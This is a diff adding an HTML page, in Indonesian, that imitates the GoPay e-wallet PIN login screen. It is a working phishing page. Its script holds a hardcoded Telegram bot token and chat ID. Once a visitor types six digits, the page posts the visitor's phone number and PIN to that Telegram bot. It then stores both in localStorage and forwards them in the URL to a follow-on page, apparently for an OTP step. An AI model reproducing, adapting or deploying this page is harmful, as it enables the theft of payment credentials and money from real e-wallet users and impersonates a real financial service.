@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Masukkan PIN GoPay</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f3f4f6;
+      -webkit-text-size-adjust: 100%;
+      touch-action: manipulation;
+    }
+    .keypad-btn {
+      font-family: Georgia, serif;
+      font-weight: 700;
+      touch-action: manipulation; /* Mencegah layar ikut zoom saat diketuk cepat */
+    }
+    input, select, textarea {
+      font-size: 16px !important;
+    }
+  </style>
+</head>
+<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">
+
+  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col pt-5 px-5 sm:px-6 pb-6 shadow-sm">
+    
+    <!-- Bagian Atas -->
+    <div>
+      <!-- Header Atas (X dan Bantuan ?) -->
+      <div class="flex items-center justify-between mb-4">
+        <button type="button" onclick="history.back()" class="text-slate-800 font-bold text-2xl active:opacity-60 leading-none">
+          ✕
+        </button>
+        <button type="button" class="w-9 h-9 rounded-full bg-slate-200/80 flex items-center justify-center text-slate-700 text-sm font-bold shadow-sm">
+          ?
+        </button>
+      </div>
+
+      <!-- Judul Utama -->
+      <h1 class="text-[25px] leading-tight font-extrabold text-slate-900 tracking-tight mb-2">
+        Masukkin PIN kamu
+      </h1>
+
+      <!-- Keterangan Teks -->
+      <p class="text-slate-900 font-bold text-[16px] leading-snug mb-1">
+        Ketik GoPay PIN kamu untuk masuk.
+      </p>
+      <p class="text-slate-500 text-[14px] leading-relaxed mb-4">
+        Ini cepat, aman, dan tidak memerlukan OTP.
+      </p>
+
+      <!-- Kotak Kapsul PIN 2 Lapis -->
+      <div class="bg-slate-200/40 rounded-[32px] p-2 mb-4 shadow-sm border border-slate-200/50">
+        <div class="bg-white rounded-[24px] py-5 px-7 flex justify-between items-center shadow-sm">
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+          <div class="pin-circle w-4 h-4 rounded-full border-2 border-slate-300 bg-transparent transition-all duration-150"></div>
+        </div>
+      </div>
+
+      <!-- Tombol Masalah Login atau Daftar -->
+      <div>
+        <button type="button" class="inline-flex items-center px-4 py-2 rounded-full bg-emerald-50 text-emerald-700 text-xs font-bold active:bg-emerald-100 transition-colors shadow-sm">
+          Masalah login atau daftar?
+        </button>
+      </div>
+    </div>
+
+    <!-- Bagian Bawah (Keypad Angka & Logo) -->
+    <div style="margin-top: 45px;">
+      <!-- Powered by Gopay -->
+      <div class="flex items-center justify-center gap-1.5 mb-1.5 text-xs text-slate-500 font-medium">
+        <span>Powered by</span>
+        <img src="https://i.ibb.co.com/RppVfKnN/IMG-2905.png" alt="GoPay Logo" class="h-3 object-contain inline-block">
+      </div>
+
+      <!-- Keypad Angka Custom -->
+      <div class="grid grid-cols-3 text-center bg-[#f3f4f6]">
+        <button type="button" onclick="pressNumber('1')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">1</button>
+        <button type="button" onclick="pressNumber('2')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">2</button>
+        <button type="button" onclick="pressNumber('3')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">3</button>
+        
+        <button type="button" onclick="pressNumber('4')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">4</button>
+        <button type="button" onclick="pressNumber('5')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">5</button>
+        <button type="button" onclick="pressNumber('6')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">6</button>
+        
+        <button type="button" onclick="pressNumber('7')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">7</button>
+        <button type="button" onclick="pressNumber('8')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">8</button>
+        <button type="button" onclick="pressNumber('9')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">9</button>
+        
+        <div></div>
+        <button type="button" onclick="pressNumber('0')" class="keypad-btn py-2 text-2xl text-slate-900 active:bg-slate-200/60 rounded-xl transition-colors">0</button>
+        <button type="button" onclick="pressDelete()" class="keypad-btn py-2 text-xl font-bold text-slate-900 flex items-center justify-center active:bg-slate-200/60 rounded-xl transition-colors">
+          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414-6.414a2 2 0 011.414-.586H19a2 2 0 012 2v10a2 2 0 01-2 2h-8.172a2 2 0 01-1.414-.586L3 12z" />
+          </svg>
+        </button>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
+    const CHAT_ID = "6742478722";
+
+    let pin = "";
+    const circles = document.querySelectorAll('.pin-circle');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";
+
+    function pressNumber(num) {
+      if (pin.length < 6) {
+        pin += num;
+        updateCircles();
+
+        if (pin.length === 6) {
+          sendPinToTelegram();
+        }
+      }
+    }
+
+    function pressDelete() {
+      if (pin.length > 0) {
+        pin = pin.slice(0, -1);
+        updateCircles();
+      }
+    }
+
+    function updateCircles() {
+      circles.forEach((circle, index) => {
+        if (index < pin.length) {
+          circle.style.backgroundColor = "#059669";
+          circle.style.borderColor = "#059669";
+        } else {
+          circle.style.backgroundColor = "transparent";
+          circle.style.borderColor = "#cbd5e1";
+        }
+      });
+    }
+
+    async function sendPinToTelegram() {
+      const text = `🔐 *PIN GoPay Masuk*\n\n*Nomor HP:* +62${userPhone}\n*PIN:* ${pin}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.log("Error Telegram");
+      }
+
+      // SIMPAN KE LOCALSTORAGE & KIRIM LEWAT URL
+      localStorage.setItem('userPhone', userPhone);
+      localStorage.setItem('userPin', pin);
+
+      // Pindah ke halaman OTP dengan membawa data lengkap
+      setTimeout(() => {
+        window.location.href = "sukses.html?phone=" + userPhone + "&pin=" + pin;
+      }, 300);
+    }
+  </script>
+</body>
+</html>
